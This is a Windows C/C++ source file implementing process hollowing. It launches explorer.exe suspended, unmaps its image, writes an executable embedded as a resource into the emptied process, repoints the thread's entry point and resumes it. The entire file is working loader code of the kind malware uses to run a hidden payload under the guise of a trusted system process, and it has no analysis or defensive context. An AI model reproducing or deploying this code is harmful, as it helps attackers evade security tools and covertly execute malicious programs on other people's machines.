#include <stdio.h>
#include "helper.h"
#include <windows.h>
#include <wdbgexts.h>
#include "resource.h"

int main()
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	HINSTANCE handleNtDll = LoadLibrary("ntdll");

	FARPROC fpNtQueryInformationProcess = GetProcAddress(handleNtDll, "NtQueryInformationProcess");
	FARPROC fpZwUnmapViewOfSection = GetProcAddress(handleNtDll, "ZwUnmapViewOfSection");

	_NtQueryInformationProcess NtQueryInformationProcess = (_NtQueryInformationProcess)fpNtQueryInformationProcess;
	_ZwUnmapViewOfSection ZwUnmapViewOfSection = (_ZwUnmapViewOfSection)fpZwUnmapViewOfSection;

	
	if (!CreateProcess("C:\\Windows\\System32\\explorer.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
	{
		printf("CreateProcess Failed: %d.\n", GetLastError());
	}


	PROCESS_BASIC_INFORMATION pbi;
	PULONG returnLength = NULL;

	NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), returnLength);

	/* Retrieve PEB info of created process */
	PPEB pPeb = new PEB();
	ReadProcessMemory(pi.hProcess, pbi.PebBaseAddress, pPeb, sizeof(PEB), 0);

	ZwUnmapViewOfSection(pi.hProcess, pPeb->ImageBaseAddress);

	/* Find and load Resource exe */
	HRSRC resource = FindResource(NULL, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
	HGLOBAL resourceData = LoadResource(NULL, resource);

	/* Get pointer to the resource base address */
	LPVOID lpBaseAddressResource = LockResource(resourceData);


	PIMAGE_DOS_HEADER dosHeaderResource = (PIMAGE_DOS_HEADER)lpBaseAddressResource;

	if (dosHeaderResource->e_magic != IMAGE_DOS_SIGNATURE) 
	{
		printf("Failed: .exe does not have a valid signature %i", GetLastError());
	}
		
	PIMAGE_NT_HEADERS pNTHeaderResource = (PIMAGE_NT_HEADERS)((DWORD)dosHeaderResource + (DWORD)dosHeaderResource->e_lfanew);

	VirtualAllocEx(pi.hProcess, pPeb->ImageBaseAddress, pNTHeaderResource->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	

	BYTE* headerBuffer = new BYTE[pNTHeaderResource->OptionalHeader.SizeOfHeaders];

	memcpy(headerBuffer, dosHeaderResource, pNTHeaderResource->OptionalHeader.SizeOfHeaders);


	if (!WriteProcessMemory(pi.hProcess, pPeb->ImageBaseAddress, headerBuffer, pNTHeaderResource->OptionalHeader.SizeOfHeaders, NULL))
	{
		printf("Failed: Unable to write headers: %i", GetLastError());
		return -1;
	}

	
	PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(pNTHeaderResource);

	for (int i = 0; i < pNTHeaderResource->FileHeader.NumberOfSections; i++)
	{
		PBYTE section = new BYTE[(DWORD)sectionHeader->SizeOfRawData];
		memcpy(section, (PVOID)((DWORD)dosHeaderResource + (DWORD)sectionHeader->PointerToRawData), (DWORD)sectionHeader->SizeOfRawData);

		printf("Copying data from: %s\n", sectionHeader->Name);

		if (!WriteProcessMemory(pi.hProcess, (LPVOID)((DWORD)pPeb->ImageBaseAddress + (DWORD)sectionHeader->VirtualAddress), section, (DWORD)sectionHeader->SizeOfRawData, NULL))
		{
			printf("Failed Copying section: %s Error: %i", sectionHeader->Name, GetLastError());
			return -1;
		}
		sectionHeader++;
	}
	

	PCONTEXT lpContext = new CONTEXT();
	lpContext->ContextFlags = CONTEXT_FULL;
	GetThreadContext(pi.hThread, lpContext);
	lpContext->Eax = (DWORD)pPeb->ImageBaseAddress + (DWORD)pNTHeaderResource->OptionalHeader.AddressOfEntryPoint;

	SetThreadContext(pi.hThread, lpContext);

	ResumeThread(pi.hThread);


	printf("Created Process id: %i\n", pi.dwProcessId);
	printf("Size of Image: %u\n", pNTHeaderResource->OptionalHeader.SizeOfImage);
	printf("Created Process PebBaseAddress: 0x%x\n", pbi.PebBaseAddress);
	printf("Created Process Image Base Address %x\n", pPeb->ImageBaseAddress);
	printf("Source Base Address %x\n", pNTHeaderResource->OptionalHeader.ImageBase);

	return 0;
}